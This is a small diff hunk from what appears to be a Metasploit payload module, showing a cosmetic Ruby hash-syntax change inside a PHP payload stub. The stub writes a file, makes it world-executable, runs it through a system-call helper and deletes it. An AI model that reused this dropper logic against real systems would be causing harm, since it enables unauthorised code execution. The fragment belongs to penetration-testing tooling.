@@ -63,8 +63,8 @@ module Metasploit3
     fclose($fd_out);
     chmod($fname, 0777);
     $c = $fname;
-    #{php_preamble({:disabled_varname => dis})}
-    #{php_system_block({:cmd_varname => "$c", :disabled_varname => dis})}
+    #{php_preamble({disabled_varname: dis})}
+    #{php_system_block({cmd_varname: "$c", disabled_varname: dis})}
     @unlink($fname);
     END_OF_PHP_CODE
 
